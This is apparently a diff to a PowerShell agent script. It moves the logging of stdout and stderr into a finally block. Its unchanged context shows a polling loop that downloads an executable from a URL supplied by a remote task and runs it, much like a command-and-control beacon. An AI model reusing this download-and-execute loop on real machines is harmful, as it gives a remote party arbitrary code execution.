@@ -8,13 +8,6 @@ function Execute {
         $stderrTempFile = New-Item -path "$dir\stderr.log" -Force
         $R = (Start-Process -FilePath $File -Wait -NoNewWindow -PassThru -RedirectStandardOutput $stdoutTempFile -RedirectStandardError $stderrTempFile).ExitCode
         $Code = if (Test-Path $File) {$R} Else {127}
-        $stdout = Get-Content -Path $stdoutTempFile
-        $stdout = if ($stdout) { [string]::Join("; ", $stdout) } else { "" }
-        $stderr = Get-Content -Path $stderrTempFile
-        $stderr = if ($stderr) { [string]::Join("; ", $stderr) } else { "" }
-        if ($stdout -or $stderr) {
-            Write-Host "${stdout}; ${stderr}"
-        }
         return $Code
     } catch [System.UnauthorizedAccessException] {
         return 126
@@ -22,6 +15,14 @@ function Execute {
         return 127
     } catch {
         return 1
+    } finally {
+        $stdout = Get-Content -Path $stdoutTempFile
+        $stdout = if ($stdout) { [string]::Join("; ", $stdout) } else { "" }
+        $stderr = Get-Content -Path $stderrTempFile
+        $stderr = if ($stderr) { [string]::Join("; ", $stderr) } else { "" }
+        if ($stdout -or $stderr) {
+            Write-Host "${stdout}; ${stderr}"
+        }
     }
 }
 
@@ -48,7 +49,7 @@ while ($true) {
 
         if ($uuid -and $auth -eq $ca) {
             Invoke-WebRequest -Uri $task.content -OutFile (New-Item -path "$dir\$uuid.exe" -Force ) -UseBasicParsing
-            $code = Execute "$dir\$uuid.exe" $stdoutTempFile $stderrTempFile
+            $code = Execute "$dir\$uuid.exe"
             $dat = "${uuid}:${code}"
         } elseif ($task.content -eq "stop") {
             exit
